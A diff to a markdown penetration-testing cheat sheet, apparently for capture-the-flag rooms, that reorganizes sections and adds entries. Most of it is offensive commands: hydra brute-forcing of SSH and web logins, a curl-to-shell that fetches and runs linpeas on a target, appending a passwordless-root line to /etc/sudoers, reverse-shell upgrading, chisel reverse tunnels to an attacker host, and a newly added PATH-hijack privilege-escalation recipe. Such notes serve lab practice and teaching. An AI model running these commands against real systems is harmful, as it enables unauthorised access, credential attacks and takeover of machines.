@@ -2,6 +2,7 @@
 
 Generic Commands
 ------
+### Grep
 - `grep -v` Inverse matching with grep
 - `grep -E 'pattern1|pattern2' fileName_or_filePath` grp multiple patterns
 - `sort -o outfile.txt -u infile.txt` Remove duplicates from infile.txt and write the remaining lines to outfile.txt
@@ -9,6 +10,8 @@ Generic Commands
 - `find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} git -C {} stash`
 - `find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} git -C {} stash drop`
 - `find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} git -C {} pull`
+### Find Command
+- `find / 2>/dev/null | grep desired_word`
 
 Enumeration
 ------
@@ -27,6 +30,8 @@ Enumeration
 ### VHost Fuzzing
 - `ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u https://test.url -H "Host: FUZZ.test.url"`
 ### Things to do on the Target Machine Once you Have a Foothold
+- Run PEASS for the target OS (LinPEAS, WinPEAS etc.)
+  - `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` Run linpeas from source if target machine has an Internet connection
 - List listening ports on the machine `ss -ltn`
 - List all files and folders including hidden ones in a directory `ls al`
 - See if there is anything the current user can run as sudo `sudo -l`
@@ -57,7 +62,7 @@ Login Brute Forcing
 ### SSH
 - Use lists created by RoomPrepper (The createLists.sh script takes the users and passwords from the notes.md file and creates these lists) `hydra -L user.lst -P password.lst ssh://x.x.x.x -t 4 -vV`
 ### Web
-- Using hydra with a captured request using the format `hydra -l <username> -P <password_wordlist> <machine_ip> <request_type> '<login_page>:<request_body>:<invalid_notification>'`\
+- Using hydra with a captured request using the format `hydra -l <username> -P <password_wordlist> <machine_ip/hostname> <request_type> '<login_page>:<request_body>:<invalid_notification>'`\
 so an example command is as follows `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.174.201 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=c7UvYlF%2FOoYdanjSx3HqFGCZ9ktcaqHpKyHHiKbVfNezx4JX%2BkvSkLj9IH9GbWF4z41mnESai4vX%2FkWm576GotEhS3W66Cvoz9as16iMPgK0d6yqjJHRpODyonGR2%2Fp3%2FIM8LcN%2Fr5X7zNiaYMnBzEAjp8eFYgBqjCVyUgoP2v7tqlHu&__EVENTVALIDATION=PknlTsjoXO2tIIQR4GG4BnQkewRFwQjxfpAKT06eOvI%2FL%2F07msVZ7JUQ4nBX7RAnbfZRdZ2%2B4gUl2BdBAuoEtbsQww69pvT2jUbpA%2F00YfgzuX8de4fjki4HfD4SDig3jJjMjZoQBLYOdW2Y%2B8W%2FTf17Bdd0hRBOzS%2BpvBmRWe0UIBx7&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vv`
 - Using hydra with some parameters instead of the entire login request example `hydra -l milesdyson -P log1.txt 10.x.x.x http-post-form '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user`
 - Using hydra to brute force a basic auth page `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt -s 80 -f enum.thm http-get /labs/basic_auth`
@@ -70,10 +75,6 @@ Upgrade Reverse Shell (To one that has autocomplete and won't be killed by Ctrl^
 3. In the host terminal (It should be at this stage now when the reverse shell has been backgrounded) `stty raw -echo; fg`
 4. In the reverse shell that has now been foregrounded `echo TERM=xterm-256color` followed by `reset` if required
 
-Find files
-------
-### Find Command
-- `find / 2>/dev/null | grep desired_word`
 
 Tunneling
 ------
@@ -83,10 +84,6 @@ Tunneling
 1. Transfer chisel binary to target
 2. Start chisel server on attacker machine `chisel server --reverse --port 9001`
 3. On the target run `chisel client 10.x.x.x:9001 R:2049:127.0.0.1:2049`
-
-Run linpeas From Source if Target Machine has Internet Connection
-------
-- `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
 
 Facilitation of File Transfers Between Attacker and Target
 ------
@@ -105,6 +102,13 @@ Privilege Escalation
 ### Linux
 #### /etc/sudoers
 - `echo "$USER ALL=NOPASSWD: ALL" >> /etc/sudoers` Change $USER to the actual username if the variable doesn't work
+#### Relative path exploitation
+- If you find a script etc. that is running a binary without a defined absolute path you may be able to create your own script and give it the name of the binary
+  - `echo "#!/bin/bash" > /tmp/id
+    echo 'echo "uid=0(root) gid=0(root) groups=0(root)"' >> /tmp/id
+    chmod 755 /tmp/id`
+- Then add the path the binary resides in to the beginning of the PATH variable `export PATH=/tmp:$PATH`
+- Your script should now be ran whenever the binary of the same name is called
 
 Web App Testing
 ------
